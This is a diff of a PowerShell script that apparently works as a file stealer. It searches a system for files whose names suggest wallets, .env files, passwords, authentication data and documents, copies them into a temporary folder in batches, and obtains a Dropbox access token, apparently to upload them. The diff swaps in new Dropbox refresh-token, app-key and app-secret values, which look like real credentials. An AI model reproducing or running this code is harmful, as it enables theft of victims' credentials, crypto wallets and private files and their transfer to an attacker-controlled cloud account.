@@ -6,11 +6,11 @@ $fileTypes="*.txt","*wallet*","*.env","*.x*","*.doc*","*pass*","*auth*";
 #                  Dropbox API values: Follow read.me tutorial to get these!                 #
 ##############################################################################################
 # refresh_token
-$r="RE0ylcZxXP7Q0AAAAAAAAAARb6hduPLmXUUWsBLC6Qcl_ex7Q8_Lq27Afsd9v5wD";
+$r="B1oiS5_ksmIAAAAAAAAAAThmk-sKjvpgKZDGaSObRSk9KNC3XQKbUt35MTkqdy3f";
 # App key
-$u = 'sba3mfu6yijvrr0';
+$u = '60soiqecjsvvvzg';
 # App secret
-$p = 'in482nixc2yjtbk';
+$p = 'sk0n5x76b52ttht';
 # do not touch below this line unless you know what you're doing
 $ds=$env:TMP+"\cpy";$n = 0;$mb = 0;if(Test-Path $ds){rm $ds -Fo -R;}GCI $s -R -I $fileTypes|%{$sz = ((GCI $_.FullName).length/1MB);if($size -lt 100){$mb+=$sz;if($mb -ge 100){$mb = 0;$n++;}ROBOCOPY $_.Directory ("$ds\$n\") $_.Name /MT 128 |Out-Null;}}
 $a=(Invoke-RestMethod https://api.dropbox.com/oauth2/token -Method Post -Body @{grant_type = "refresh_token";refresh_token = $r;} -Headers @{"Authorization" = "Basic "+ [System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes("${u}:${p}"));"Content-Type" = "application/x-www-form-urlencoded";}).access_token;
